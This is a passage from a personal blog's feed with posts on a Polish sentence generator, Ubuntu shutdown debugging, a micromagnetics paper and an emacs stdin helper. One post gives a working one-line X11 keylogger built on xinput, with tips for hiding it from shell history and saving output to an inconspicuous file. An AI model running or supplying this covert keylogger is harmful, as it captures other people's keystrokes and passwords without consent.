+&lt;div id=&quot;output&quot; class=&quot;lead text-center&quot;&gt;&lt;/div&gt;
+
+&lt;div style=&quot;height: 2em&quot;&gt;
+    &lt;div id=&quot;translation&quot; class=&quot;text-muted text-center&quot;&gt; &lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;button class=&quot;btn btn-primary&quot; style=&quot;margin-top: 1em;&quot; type=&quot;button&quot; onclick=&quot;ctrl.generate()&quot;&gt;
+    Generate some nonsense
+&lt;/button&gt; 
+&lt;button class=&quot;btn btn-default&quot; style=&quot;margin-top: 1em;&quot; type=&quot;button&quot; onclick=&quot;ctrl.toggleTranslation()&quot;&gt;
+    Toggle translation
+&lt;/button&gt;&lt;/p&gt;
+
+&lt;script src=&quot;http://cdn.rawgit.com/davidshepherd7/polish-generator/v3-pronoun-fixes/bundle.js&quot;&gt;&lt;/script&gt;
+
+&lt;h3 id=&quot;what&quot;&gt;What??&lt;/h3&gt;
+
+&lt;p&gt;This attempts to generate grammatically valid but semantically meaningless
+Polish sentences. At the moment it’s very simple and can only generate sentences
+of the form “Noun Verb” (e.g. the boy runs, the dog eats, etc), with the
+occasional adjective thrown in. There are probably mistakes, I’m still learning!&lt;/p&gt;
+
+&lt;h3 id=&quot;but-why&quot;&gt;But why?&lt;/h3&gt;
+
+&lt;p&gt;I’m learning Polish (slowly) and I recently came across an English sentence
+generator in &lt;a href=&quot;https://github.com/norvig/paip-lisp/&quot;&gt;Paradigms of AI Programming&lt;/a&gt;, 
+so I thought it might be fun to put the two together.&lt;/p&gt;
+
+&lt;h3 id=&quot;technology&quot;&gt;Technology&lt;/h3&gt;
+
+&lt;p&gt;I started out using common lisp (following the examples in PAIP), but then
+decided I wanted to show the results in a webpage so I switched to typescript
+(because type safety makes life much much easier).&lt;/p&gt;
+
+&lt;p&gt;I prototyped the generator as a console application in node, then once I was
+happy with the logic I used &lt;a href=&quot;http://browserify.org/&quot;&gt;browserify&lt;/a&gt; to bundle the
+compiled javascript with the dependencies in way that browsers can handle. I’m
+really impressed with how easy it was to use compared to gulp or webpack: just
+run &lt;code&gt;browserify index.js -o bundle.js&lt;/code&gt; (where &lt;code&gt;index.js&lt;/code&gt; is a node application)
+and then serve &lt;code&gt;bundle.js&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;I used a bit of a hack to expose the necessary functions to the html. In
+&lt;code&gt;index.ts&lt;/code&gt; I put:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(window as any).ctrl = {
+    generate,
+    toggleTranslation,
+    /* etc */
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;which seems to work nicely.&lt;/p&gt;
+
+&lt;p&gt;The source code is &lt;a href=&quot;https://github.com/davidshepherd7/polish-generator&quot;&gt;on github&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="polish" /><category term="grammar" /><category term="nlp" /><summary type="html">Polish nonesense phrase generator</summary></entry><entry><title type="html">A one-line X11 keylogger</title><link href="/keyloggers.html" rel="alternate" type="text/html" title="A one-line X11 keylogger" /><published>2016-10-16T00:00:00+01:00</published><updated>2016-10-16T00:00:00+01:00</updated><id>/keyloggers</id><content type="html" xml:base="/keyloggers.html">&lt;p&gt;It’s an old adage that you can’t secure a computer against people with physical
+access to it. I was interested in this idea, so I was exploring what could be done
+with only keyboard and mouse access to a typical Ubuntu machine (i.e. without
+being able to plug in usb devices or pull out hard drives) when I came across
+the &lt;code&gt;xinput test&lt;/code&gt; command. I’m sure this is old hat to anyone with a real
+interest in security, and I’m sure there are plenty of ways to counter it; but I
+think it’s interesting anyway.&lt;/p&gt;
+
+&lt;p&gt;So, here’s how to run an X11-based keylogger which writes to a local file and
+probably won’t be noticed by a non-paranoid user: Open a terminal, run&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; nohup xinput test $(xinput list | grep 'AT Translated' | sed 's/.*id=\([0-9]*\).*/\1/') &amp;gt; /tmp/tmp.QTQTivXDhI
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;with a leading space character (markdown eats leading spaces in code samples..)
+and close the terminal. You may need to change the &lt;code&gt;AT Translated&lt;/code&gt; to the name
+of your keyboard to get it working one your machine, have a look at the output
+of &lt;code&gt;xinput list&lt;/code&gt;. Now press some keys and it will write into
+&lt;code&gt;/tmp/tmp.QTQTivXDhI&lt;/code&gt; something like:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;key press   40
+key press   47
+key release 40
+key press   58
+key press   45
+key release 47
+key release 58
+key release 45
+key press   41
+key press   43
+key release 41
+key press   46
+key release 43
+key press   44
+key release 46
+key press   28
+key release 44
+key press   65
+key release 28
+key release 65
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;those numbers are X11 keycodes which can be translated to key names if you know
+the keyboard layout in use.&lt;/p&gt;
+
+&lt;p&gt;Here’s a breakdown of the command:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;The leading space tells bash not to record the command in it’s history&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code&gt;nohup&lt;/code&gt; prevents it from stopping when you close the terminal&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code&gt;xinput test&lt;/code&gt; is the command which does the actual keylogging&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code&gt;$(...)&lt;/code&gt; finds the id of the keyboard to log&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code&gt;&amp;gt; /tmp/tmp/....&lt;/code&gt; writes the output to an inconspicuous looking file&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Of course to make any use of this an attacker would need to come back to the
+machine and inspect the resulting file, but if someone can get access once they
+can probably do it a second time.&lt;/p&gt;
+
+&lt;p&gt;I’m not sure that this is a real problem since there are so many other things
+that an attacker with this kind of access could do. This is one of many security
+issues with X11 that Wayland
+&lt;a href=&quot;https://blog.martin-graesslin.com/blog/2015/11/looking-at-the-security-of-plasmawayland/&quot;&gt;should solve&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="linux" /><category term="X11" /><category term="security" /><summary type="html">It’s an old adage that you can’t secure a computer against people with physical access to it. I was interested in this idea, so I was exploring what could be done with only keyboard and mouse access to a typical Ubuntu machine (i.e. without being able to plug in usb devices or pull out hard drives) when I came across the xinput test command. I’m sure this is old hat to anyone with a real interest in security, and I’m sure there are plenty of ways to counter it; but I think it’s interesting anyway.</summary></entry><entry><title type="html">Debugging a slow system shutdown</title><link href="/ubuntu-slow-shutdown.html" rel="alternate" type="text/html" title="Debugging a slow system shutdown" /><published>2016-10-16T00:00:00+01:00</published><updated>2016-10-16T00:00:00+01:00</updated><id>/ubuntu-slow-shutdown</id><content type="html" xml:base="/ubuntu-slow-shutdown.html">&lt;p&gt;I’ve read some interesting debugging stories recently, so here’s one of mine.
+Hopefully it might help others who have similar issues.&lt;/p&gt;
+
+&lt;p&gt;Recently my laptop started taking &lt;em&gt;much&lt;/em&gt; longer than usual to turn off:
+instead of ~1 second it would take ~20. Around the same time I had the exact
+same problem on my work machine which runs a different version of Ubuntu. So it
+seemed likely that the issue was something in my configuration rather than a
+real bug.&lt;/p&gt;
+
+&lt;p&gt;I started by &lt;a href=&quot;http://unix.stackexchange.com/questions/159221/how-display-log-messages-from-previous-boots-under-centos-7&quot;&gt;enabling persistant systemd logs&lt;/a&gt; so that I could
+read the logs recorded during a shutdown. Once that was set up I rebooted the
+laptop, then checked the logs with &lt;code&gt;journalctl --boot=-1&lt;/code&gt;. Skimming through the
+last few items I noticed that there was a 28 second wait before the line
+&lt;code&gt;Stopped LSB: &quot;privilege escalation detection system&quot;&lt;/code&gt; which seemed suspicious.&lt;/p&gt;
+
+&lt;p&gt;Some more googling and I found &lt;a href=&quot;https://askubuntu.com/questions/786596/random-stop-jobs-on-shutdown-bootup&quot;&gt;this askUbuntu question&lt;/a&gt; by someone
+having the same issue as me. It turns out that I’d unwittingly installed
+something called &lt;a href=&quot;http://blog.bodhizazen.net/linux/how-to-ninja/&quot;&gt;“ninja”&lt;/a&gt; that watches out for suspicious looking
+programs running as root. I suspect that on both of my machines I had attempted
+to install &lt;a href=&quot;https://ninja-build.org/&quot;&gt;ninja-the-build system&lt;/a&gt; (&lt;code&gt;apt-get install ninja-build&lt;/code&gt;)
+and instead installed ninja-the-monitoring-daemon (&lt;code&gt;apt-get install ninja&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;Moral of the story: check out unknown packages using &lt;code&gt;apt-cache show&lt;/code&gt; before you install them!&lt;/p&gt;</content><author><name></name></author><category term="linux" /><category term="systemd" /><category term="ninja" /><summary type="html">I’ve read some interesting debugging stories recently, so here’s one of mine. Hopefully it might help others who have similar issues.</summary></entry><entry><title type="html">Publication: Discretization-Induced Stiffness in Micromagnetic Simulations</title><link href="/llg-stiffness-paper.html" rel="alternate" type="text/html" title="Publication: Discretization-Induced Stiffness in Micromagnetic Simulations" /><published>2015-06-10T00:00:00+01:00</published><updated>2015-06-10T00:00:00+01:00</updated><id>/llg-stiffness-paper</id><content type="html" xml:base="/llg-stiffness-paper.html">&lt;p&gt;I &lt;a href=&quot;http://ieeexplore.ieee.org/xpl/login.jsp?arnumber=6971771&quot;&gt;published a paper&lt;/a&gt; a while ago, but I’ve been pretty busy so hadn’t gotten around to figuring out the rules about posting it online. Anyway it looks like I’m allowed to host it on my personal website, so here it is!&lt;/p&gt;
+
+&lt;p&gt;The abstract is:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;In the numerical integration of the Landau-Lifshitz-Gilbert
+(LLG) equation, stiffness (stability restrictions on the time step
+size for explicit methods) is known to be a problem in some
+cases. We examine the relationship between stiffness and spatial
+discretisation size for the LLG with exchange and magnetostatic
+effective fields. A maximum stable time step is found for the
+reversal of a single domain spherical nanoparticle with a variety
+of magnetic parameters and numerical methods. From the lack
+of stiffness when solving a physically equivalent ODE problem
+we conclude that any stability restrictions in the PDE case arise
+from the spatial discretisation rather than the underlying physics.
+We find that the discretisation induced stiffness increases as
+the mesh is refined and as the damping parameter is decreased.
+In addition we find that use of the FEM/BEM method for
+magnetostatic calculations increases the stiffness. Finally, we
+observe that the use of explicit magnetostatic calculations within
+an otherwise implicit time integration scheme (i.e. a semi-implicit
+scheme) does not cause stability issues.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In plain English: I investigated when and why one class of algorithms becomes more efficent than another class of algorithms for an important problem in the study of magnetic materials.&lt;/p&gt;
+
+&lt;p&gt;Here’s the &lt;a href=&quot;/trans-mag-paper-2014.pdf&quot;&gt;paper&lt;/a&gt; itself.&lt;/p&gt;</content><author><name></name></author><summary type="html">I published a paper a while ago, but I’ve been pretty busy so hadn’t gotten around to figuring out the rules about posting it online. Anyway it looks like I’m allowed to host it on my personal website, so here it is!</summary></entry><entry><title type="html">Reading from stdin to an emacs buffer</title><link href="/emacs-from-stdin.html" rel="alternate" type="text/html" title="Reading from stdin to an emacs buffer" /><published>2014-11-22T00:00:00+00:00</published><updated>2014-11-22T00:00:00+00:00</updated><id>/emacs-from-stdin</id><content type="html" xml:base="/emacs-from-stdin.html">&lt;p&gt;Sometimes the way emacs utterly ignores standard unix conventions can be pretty annoying. In particular the fact that, unlike almost every other standard unix tool, you can’t give it &lt;code&gt;-&lt;/code&gt; instead of a filename and have it read from stdin has always annoyed me (yes, I know emacs came from lisp machines not unix, but it’s been used on unix machines since &lt;a href=&quot;http://en.wikipedia.org/wiki/GNU_Emacs#History&quot;&gt;before I was born&lt;/a&gt;). So today I’ve final sat down and figured out how to hack around this limitation.&lt;/p&gt;
+
+&lt;p&gt;First of all I should note that there is an existing package called &lt;a href=&quot;https://github.com/lewang/e-sink&quot;&gt;&lt;code&gt;e-sink&lt;/code&gt;&lt;/a&gt; to read from stdin. However the code seems unnecessarily complex (probably doesn’t help that I don’t know perl).&lt;/p&gt;
+
+&lt;p&gt;So, here’s my solution:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# The emacs or emacsclient to use&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;_emacsfun
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# Replace with `emacs` to not run as server/client&lt;/span&gt;
+    emacsclient &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+
+&lt;span class=&quot;c&quot;&gt;# An emacs 'alias' with the ability to read from stdin&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;e
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# If the argument is - then write stdin to a tempfile and open the&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# tempfile.&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; - &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;tempfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp &lt;/span&gt;emacs-stdin-&lt;span class=&quot;nv&quot;&gt;$USER&lt;/span&gt;.XXXXXXX &lt;span class=&quot;nt&quot;&gt;--tmpdir&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; - &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tempfile&lt;/span&gt;
+        _emacsfun &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;(progn (find-file &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tempfile&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)
+                             (set-visited-file-name nil)
+                             (rename-buffer &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;*stdin*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; t))
+                 &quot;&lt;/span&gt; 2&amp;gt;&amp;amp;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null
+    &lt;span class=&quot;k&quot;&gt;else
+        &lt;/span&gt;_emacsfun &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If you prefer to use a standalone emacs just replace &lt;code&gt;emacsclient -c -n&lt;/code&gt; in &lt;code&gt;_emacsfun&lt;/code&gt; with &lt;code&gt;emacs&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The function is called as&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hello world&quot;&lt;/span&gt; | e -&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;or&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;e hello_world.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;One more note: each time you read from stdin a temporary file in &lt;code&gt;/tmp&lt;/code&gt; is created, these are typically cleared on reboot which is good enough for me. If you need them to be gone immediately you could add &lt;code&gt;rm $tempfile&lt;/code&gt; inside the &lt;code&gt;if&lt;/code&gt; statement.&lt;/p&gt;
+
+&lt;p&gt;As always the code is &lt;a href=&quot;https://github.com/davidshepherd7/emacs-read-stdin&quot;&gt;on github&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="emacs" /><category term="unix" /><category term="stdin" /><category term="shell" /><summary type="html">Sometimes the way emacs utterly ignores standard unix conventions can be pretty annoying. In particular the fact that, unlike almost every other standard unix tool, you can’t give it - instead of a filename and have it read from stdin has always annoyed me (yes, I know emacs came from lisp machines not unix, but it’s been used on unix machines since before I was born). So today I’ve final sat down and figured out how to hack around this limitation.</summary></entry></feed>
